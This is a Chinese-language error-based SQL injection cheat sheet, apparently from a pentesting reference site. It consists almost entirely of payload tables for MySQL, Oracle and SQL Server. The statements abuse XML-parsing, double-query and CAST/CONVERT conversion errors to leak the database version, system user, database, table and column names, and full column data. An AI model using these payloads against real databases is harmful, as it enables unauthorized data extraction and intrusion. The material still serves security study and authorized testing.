### 基于错误{docsify-ignore-all}

当无效输入传递给数据库时，通过触发数据库中的错误来利用基于错误的注入。错误消息可用于返回完整的查询结果，或获取有关如何重构查询以供进一步利用的信息。

#### MYSQL

| 描述   |      语句     |  
|----------|:-------------:|
| XML解析错误   |      SELECT extractvalue(rand(),concat(0x3a,(select version())))     | 
| 双查询   |     SELECT 1 AND(SELECT 1 FROM(SELECT COUNT(\*),concat(0x3a,(**SELECT username FROM USERS LIMIT 0,1**),FLOOR(rand(0)\*2))x FROM information_schema.TABLES GROUP BY x)a)  <br />递增 limit 0,1到limit 1,1开始循环数据  |  
| 获取当前数据库   |      SELECT a()     |  

#### Oracle

| 描述   |      语句     |  
|----------|:-------------:|
| 无效的HTTP请求  |      SELECT utl\_inaddr.get\_host\_name((select banner from v$version where rownum=1)) FROM dual     |
| CTXSYS.DRITHSX.SN   |      SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual     | 
| 无效的XPath   |      SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual     | 
| 无效的XML   |      SELECT to\_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" FROM sys.dual')) FROM dual    | 
| 无效的XML   |      	SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users     | 



#### SQL Server

| 描述   |      语句     |  
|----------|:-------------:|
| 显式转换   |      SELECT convert(int,(SELECT @@version)) <br />SELECT cast((SELECT @@version) as int)     |  
| 隐式转换   |      SELECT 1/@@version     |  

### MSSQL CAST函数示例

以下任何查询都可以使用该`convert`函数重写或作为隐式转换.

| 描述   |      语句     |  
|----------|:-------------:|
| 将CAST函数注入当前查询   |      SELECT CAST(@@version as int)     |  
| 显示系统用户   |      SELECT CAST(SYSTEM_USER as int);     |  
| 用xml路径在一行中显示所有数据库   |      SELECT CAST((SELECT name,',' FROM master..sysdatabases FOR XML path('')) as int) <br >SELECT CAST((SELECT name AS "data()" FROM master..sysdatabases FOR xml path('')) AS int);     |  
| 显示服务器名称   |      SELECT CAST(@@SERVERNAME as int);     |  
| 显示服务名称  |      SELECT CAST(@@SERVICENAME as int);     |  
| 显示数据库列表 <br />注意：下面的查询必须在一行中执行。   |      `DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = '';SELECT @listStr = @listStr + Name + ',' FROM master..sysdatabases;SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput as int); `    |  
| 显示表列表 <br /> 注意：下面的查询必须在一行中执行  |      `DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX); SET @listStr = '';SELECT @listStr = @listStr + Name + ',' FROM MYDATABASE..sysobjects WHERE type = 'U';SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput as int);`     |  
| 显示列列表 <br />注意：下面的查询必须在一行中执行。   |      `DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = '';SELECT @listStr = @listStr + Name + ',' FROM MYDATABASE..syscolumns WHERE id=object_id('MYTABLE');SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);select cast(@myoutput as int);`    |  
| 显示列数据<br />注意：下面的查询必须在一行中执行。 用`*`替换`MYCOLUMN`来选择所有列  |      `DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = '';SELECT @listStr = @listStr + MYCOLUMN + ',' FROM MYDATABASE..MYTABLE;SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1)SELECT CAST(@myoutput as int); `    |  
| 一次显示一个数据库名称<br />注意：递增内部TOP值以获取下一条记录  |      ` SELECT TOP 1 CAST(name as int) FROM sysdatabases WHERE name in (SELECT TOP 2 name FROM sysdatabases ORDER BY name ASC) ORDER BY name DESC  `    |  







